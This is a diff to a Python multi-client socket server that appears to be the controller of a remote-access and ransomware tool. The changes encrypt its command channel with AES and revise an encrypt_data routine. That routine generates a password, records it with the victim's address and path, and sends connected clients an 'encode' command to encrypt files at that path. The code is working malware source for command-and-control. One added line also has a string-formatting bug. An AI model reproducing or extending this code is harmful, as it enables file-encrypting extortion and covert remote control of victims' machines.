@@ -7,6 +7,9 @@ import threading
 import time
 import tqdm
 from queue import Queue
+from crypto.Cipher import AES
+from crypto import Random
+import keys
 
 threads = 2
 arrJobs = [1, 2]
@@ -14,8 +17,10 @@ queue = Queue()
 arrAdresses = []
 arrConnections = []
 
-strHost = "localhost"
-intPort = 8080
+hash_key = keys.hash_key
+strHost = keys.host
+intPort = keys.port
+
 intBuff = 1024
 
 strName = ("""\
@@ -32,17 +37,20 @@ strName = ("""\
 print(strName)
 
 decode_utf = lambda data: data.decode("utf-8")
-
 remove_quotes = lambda string: string.replace("\"", "")
-
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
 
-send = lambda data: connection.send(data)
+def send(data):
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(hash_key, AES.MODE_CBC, iv)
+    connection.send(cipher.encrypt(iv + data))
 
-sendall = lambda data: connection.sendall(data)
 
-recv = lambda buffer: connection.recv(buffer)
-
+def recv(buffer):
+    enc = connection.recv(buffer)
+    iv = enc[:AES.block_size]
+    cipher = AES.new(hash_key, AES.MODE_CBC, iv)
+    return cipher.decrypt(enc[AES.block_size:])
 
 def receiveAll(buffer):
     byteData = b""
@@ -81,7 +89,7 @@ def accept_socket():
             connection, address = objSocket.accept()
             connection.setblocking(1)  # timeout verhindern
             arrConnections.append(connection)
-            client_info = decode_utf(connection.recv(intBuff)).split("',")
+            client_info = decode_utf(recv(intBuff)).split("',")
             address += client_info[0], client_info[1], client_info[0]
             arrAdresses.append(address)
             print("\n" + "Connection has been established : {0} ({1})".format(address[0], address[2]))
@@ -194,9 +202,10 @@ def get_random_string(length):
 
 
 def encrypt_data(path):
+    password = get_random_string(500)
     with open("encrypt_key.txt", "w") as crypt:
-        crypt.write(get_random_string(500))
-    send(str.encode("encode-%s" % arrAdresses[0]))
+        crypt.write("%s-%s-%s" % (arrAdresses[0], path, password))
+    send(str.encode("encode-%s-%s" % path, password))
 
 
 def decrypt_data(path):
